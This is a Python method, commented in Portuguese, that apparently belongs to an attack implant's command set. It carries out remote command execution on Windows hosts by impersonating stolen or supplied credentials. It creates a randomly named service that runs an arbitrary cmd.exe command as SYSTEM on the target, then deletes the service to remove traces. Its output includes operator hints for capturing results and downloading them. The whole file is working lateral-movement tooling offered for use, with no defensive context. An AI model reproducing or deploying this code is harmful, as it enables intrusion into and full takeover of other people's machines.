    def sc_exec(self, task_id, target="", command="", username="", password="", svc_name=""):
        if platform.system() != 'Windows':
            return "sc_exec: only supported on Windows"
        if not target or not command:
            return "sc_exec: target and command required"

        try:
            import ctypes
            import ctypes.wintypes as W
            import hashlib, time

            advapi32 = ctypes.windll.advapi32
            kernel32  = ctypes.windll.kernel32

            # ── constantes SCM ────────────────────────────────────────────────
            SC_MANAGER_ALL_ACCESS      = 0xF003F
            SERVICE_WIN32_OWN_PROCESS  = 0x00000010
            SERVICE_DEMAND_START       = 0x00000003
            SERVICE_ERROR_IGNORE       = 0x00000000
            SERVICE_ALL_ACCESS         = 0x000F01FF
            LOGON32_LOGON_NEW_CREDENTIALS = 9
            LOGON32_PROVIDER_WINNT50      = 3

            # Nome do serviço: randômico se não fornecido (8 chars hex)
            if not svc_name:
                svc_name = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

            # ── autenticação explícita via LogonUser + ImpersonateLoggedOnUser ─
            h_token = W.HANDLE(0)
            impersonating = False
            if username:
                parts = username.split("\\", 1)
                user   = parts[1] if len(parts) == 2 else parts[0]
                domain = parts[0] if len(parts) == 2 else None

                advapi32.LogonUserW.restype  = W.BOOL
                advapi32.LogonUserW.argtypes = [
                    W.LPCWSTR, W.LPCWSTR, W.LPCWSTR,
                    W.DWORD, W.DWORD,
                    ctypes.POINTER(W.HANDLE),
                ]
                ok = advapi32.LogonUserW(
                    user, domain, password or "",
                    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
                    ctypes.byref(h_token)
                )
                if not ok:
                    return "sc_exec: LogonUserW({}) failed (error {})".format(
                        username, kernel32.GetLastError())
                advapi32.ImpersonateLoggedOnUser(h_token)
                kernel32.CloseHandle(h_token)
                impersonating = True

            def _revert():
                if impersonating:
                    advapi32.RevertToSelf()

            # ── OpenSCManagerW no host remoto ──────────────────────────────────
            advapi32.OpenSCManagerW.restype  = W.HANDLE
            advapi32.OpenSCManagerW.argtypes = [W.LPCWSTR, W.LPCWSTR, W.DWORD]

            machine = "\\\\{}".format(target)
            h_scm = advapi32.OpenSCManagerW(machine, None, SC_MANAGER_ALL_ACCESS)
            if not h_scm:
                _revert()
                return "sc_exec: OpenSCManager({}) failed (error {}) — " \
                       "verifique permissões de admin no alvo".format(
                           target, kernel32.GetLastError())

            # ── CreateServiceW ────────────────────────────────────────────────
            # Binpath: cmd.exe como wrapper para capturar qualquer comando de shell
            binpath = "C:\\Windows\\System32\\cmd.exe /c " + command

            advapi32.CreateServiceW.restype  = W.HANDLE
            advapi32.CreateServiceW.argtypes = [
                W.HANDLE,   # hSCManager
                W.LPCWSTR,  # lpServiceName
                W.LPCWSTR,  # lpDisplayName
                W.DWORD,    # dwDesiredAccess
                W.DWORD,    # dwServiceType
                W.DWORD,    # dwStartType
                W.DWORD,    # dwErrorControl
                W.LPCWSTR,  # lpBinaryPathName
                W.LPCWSTR,  # lpLoadOrderGroup
                ctypes.POINTER(W.DWORD),  # lpdwTagId
                W.LPCWSTR,  # lpDependencies
                W.LPCWSTR,  # lpServiceStartName (NULL = LocalSystem)
                W.LPCWSTR,  # lpPassword
            ]

            h_svc = advapi32.CreateServiceW(
                h_scm,
                svc_name, svc_name,
                SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE,
                binpath,
                None, None, None,
                None,  # LocalSystem (SYSTEM)
                None,
            )

            if not h_svc:
                err = kernel32.GetLastError()
                advapi32.CloseServiceHandle(h_scm)
                _revert()
                return "sc_exec: CreateService('{}') on {} failed (error {})".format(
                    svc_name, target, err)

            # ── StartServiceW ─────────────────────────────────────────────────
            advapi32.StartServiceW.restype  = W.BOOL
            advapi32.StartServiceW.argtypes = [
                W.HANDLE, W.DWORD, ctypes.POINTER(W.LPCWSTR)
            ]

            started = advapi32.StartServiceW(h_svc, 0, None)
            err_start = kernel32.GetLastError()

            # Aguarda execução antes de deletar
            time.sleep(3)

            # ── DeleteService + cleanup ───────────────────────────────────────
            advapi32.DeleteService(h_svc)
            advapi32.CloseServiceHandle(h_svc)
            advapi32.CloseServiceHandle(h_scm)
            _revert()

            # Erro 1053 = serviço não enviou sinal de start (esperado para cmd.exe)
            # Erro 1056 = serviço já rodando
            # Ambos indicam execução bem-sucedida
            if started or err_start in (0, 1053, 1056):
                return (
                    "[+] sc_exec success\n"
                    "    Target  : {}\n"
                    "    Service : {} (deletado após execução)\n"
                    "    Command : {}\n"
                    "    Runs as : SYSTEM no host remoto\n\n"
                    "[*] Para capturar output, redirecione antes:\n"
                    "    sc_exec {} \"whoami > C:\\\\Windows\\\\Temp\\\\o.txt 2>&1\"\n"
                    "    download {} C:\\\\Windows\\\\Temp\\\\o.txt"
                ).format(target, svc_name, command, target, target)
            else:
                return "[-] sc_exec: StartService falhou (error {}) — " \
                       "serviço deletado".format(err_start)

        except Exception as e:
            return "sc_exec error: {}".format(e)
